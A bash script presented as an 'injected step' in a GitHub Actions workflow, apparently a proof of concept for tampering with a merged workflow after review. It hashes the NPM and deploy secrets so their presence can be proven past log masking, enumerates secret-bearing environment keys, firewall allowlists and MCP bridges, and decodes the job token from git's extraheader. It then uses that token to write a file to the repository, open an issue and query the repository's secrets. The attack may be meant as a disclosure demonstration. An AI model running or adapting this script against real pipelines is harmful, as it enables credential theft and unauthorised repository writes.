#!/usr/bin/env bash
echo "=== INJECTED-STEP ENV READ  repo=$GITHUB_REPOSITORY run=$GITHUB_RUN_ID ==="
# Log masking hides exact secret values, so prove possession by digest instead.
for name in NPM_TOKEN DEPLOY_KEY; do
  val="${!name}"
  if [ -n "$val" ]; then
    d=$(printf "%s" "$val" | sha256sum | cut -c1-24)
    echo "SECRET_${name}_PRESENT=yes LEN=${#val} SHA256_24=$d"
  else
    echo "SECRET_${name}_PRESENT=no"
  fi
done
echo "--- full env keys visible to the injected step ---"
env | cut -d= -f1 | grep -iE "token|key|secret|deploy|npm" | sort | sed "s/^/ENVKEY=/"
echo "=== END ==="

echo "=== EGRESS ALLOWLIST AS ENFORCED IN THIS RUN ==="
for v in COPILOT_FIREWALL_ALLOW_LIST COPILOT_AGENT_FIREWALL_ALLOW_LIST; do
  [ -n "${!v:-}" ] && { echo "ENVVAR=$v COUNT=$(printf '%s' "${!v}" | tr ',' '\n' | grep -c .)"; printf '%s' "${!v}" | tr ',' '\n' | grep -iE "npmjs|pypi|crates|rubygems|packagist|nuget|maven" | sed 's/^/ALLOWED_WRITABLE_REGISTRY=/'; }
done
[ -f /home/runner/work/_temp/runtime-logs/fw.jsonl ] && echo "FW_LOG_PRESENT=yes lines=$(wc -l < /home/runner/work/_temp/runtime-logs/fw.jsonl)"
echo "--- MCP servers bridged in this runtime (firewall does not apply to MCP per GitHub docs) ---"
ps -eo args 2>/dev/null | grep -o 'mcp-proxy-bridge.js[^ ]* --proxy-url=[^ ]* --server-name=[^ ]*' | sort -u | sed 's/^/MCP_BRIDGE=/'
echo "=== END ALLOWLIST CAPTURE ==="

echo "POST_REVIEW_MARKER=this line did not exist when the maintainer reviewed and merged the workflow"
echo "POST_REVIEW_COMMIT_UTC=2026-07-30T02:19:58Z"

echo "=== TOKEN CAPABILITY UNDER THE PERMISSIONS BLOCK THIS WORKFLOW DECLARES ==="
TK=$(git config --get http.https://github.com/.extraheader 2>/dev/null | sed 's/.*basic //' | base64 -d 2>/dev/null | cut -d: -f2)
[ -z "$TK" ] && TK="$GITHUB_TOKEN"
echo "TOKEN_PREFIX=$(printf '%s' "$TK" | cut -c1-4) TOKEN_LEN=${#TK}"
api () { curl -s -o /dev/null -w "%{http_code}" -H "Authorization: Bearer $TK" -H "Accept: application/vnd.github+json" "$@"; }
echo "READ_own_repo=$(api https://api.github.com/repos/$GITHUB_REPOSITORY)"
B=$(printf 'attacker step wrote this using the job token, run %s\n' "$GITHUB_RUN_ID" | base64 -w0 2>/dev/null || printf 'attacker step wrote this\n' | base64)
echo "WRITE_new_file=$(api -X PUT -d "{\"message\":\"marker from injected step\",\"content\":\"$B\",\"branch\":\"$GITHUB_REF_NAME\"}" https://api.github.com/repos/$GITHUB_REPOSITORY/contents/ATTACKER_WROTE_THIS_$GITHUB_RUN_ID.txt)"
echo "WRITE_issue=$(api -X POST -d '{"title":"opened by the injected step","body":"job token had issues:write"}' https://api.github.com/repos/$GITHUB_REPOSITORY/issues)"
echo "READ_secrets_list=$(api https://api.github.com/repos/$GITHUB_REPOSITORY/actions/secrets)"
echo "=== END TOKEN CAPABILITY ==="
